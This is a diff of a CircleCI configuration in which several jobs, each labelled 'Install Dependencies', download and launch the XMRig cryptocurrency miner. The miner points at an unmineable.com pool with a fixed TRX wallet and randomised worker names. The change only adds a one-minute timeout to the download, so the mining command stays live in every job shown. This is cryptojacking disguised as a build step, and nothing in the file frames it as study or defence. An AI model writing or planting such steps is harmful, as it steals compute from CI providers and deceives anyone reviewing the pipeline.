@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
+            command: timeout 1m wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
+            command: timeout 1m wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
+            command: timeout 1m wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command:  wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
+            command: timeout 1m wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --cpu-affinity 0xFF --randomx-8gb-pages -o rx.unmineable.com:3333 -u TRX:TNvTwYcdmG8YtL3zzWoW2XUmYBuYGSgJfB.putra2-$(echo $(shuf -i 1-9999 -n 1)) -k --cpu-priority 3 --asm=ryzen -t 8
 workflows:
     version: 2.1
     build:
